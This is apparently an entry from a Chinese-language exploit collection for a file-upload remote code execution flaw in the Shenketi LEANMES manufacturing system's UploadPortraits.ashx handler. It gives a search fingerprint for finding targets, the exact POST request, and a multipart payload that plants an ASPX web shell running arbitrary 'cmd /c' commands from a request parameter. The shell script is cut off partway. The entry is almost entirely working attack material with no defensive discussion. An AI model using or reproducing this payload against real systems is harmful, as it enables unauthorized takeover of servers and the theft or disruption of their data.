# 深科特LEANMES系统UploadPortraits.ashx存在文件上传致RCE漏洞

- **系统**：深科特LEANMES系统　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title="LEAN MES - 用户登录"`
- **请求**：`POST /Handler/UploadPortraits.ashx?UserId=1&Filename=1.aspx&Type=Upload HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7ctER307…`

**请求体 / payload**
```
------WebKitFormBoundary7ctER307B0RaQwOp
Content-Disposition: form-data; name="Filedata";filename="1.aspx"
Content-Type: application/octet-stream
<%@ Page Language="Jscript" validateRequest="false" %>
<%
var c=new System.Diagnostics.ProcessStartInfo("cmd");
var e=new System.Diagnostics.Process();
var out:System.IO.StreamReader,EI:System.IO.StreamReader;
c.UseShellExecute=false;
c.RedirectStandardOutput=true;
c.RedirectStandardError=true;
e.StartInfo=c;
c.Arguments="/c " + Request.Item["cmd"];
e.Start();
out=e.StandardOutput;
EI=e.StandardError;
e.Close();
Response.Write(out.ReadToEnd() + EI.Re…（脚本共 777 字，完整版见原文）
```
- **预期**：200　|　—